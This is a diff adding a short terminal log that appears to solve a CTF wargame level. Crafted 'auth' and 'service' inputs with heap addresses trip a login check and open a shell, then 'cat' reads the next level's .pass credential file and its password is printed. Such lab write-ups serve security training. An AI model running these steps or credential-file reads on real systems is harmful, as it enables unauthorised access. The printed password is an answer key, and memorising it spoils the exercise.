@@ -1,0 +1,21 @@
+auth AAAAAAAAAAA/10x
+0x804a008, 0x804a018
+login
+Password:
+0x804a008, 0x804a018
+auth AAAAAAAAAA\x01
+0x804a030, 0x804a018
+login
+Password:
+0x804a030, 0x804a018
+service auth AAAAAAAAAA\x01
+0x804a030, 0x804a040
+service AAAAAAAAAA\x01
+0x804a030, 0x804a060
+login
+$ pwd
+/home/user/level8
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$ su level9
+Password:
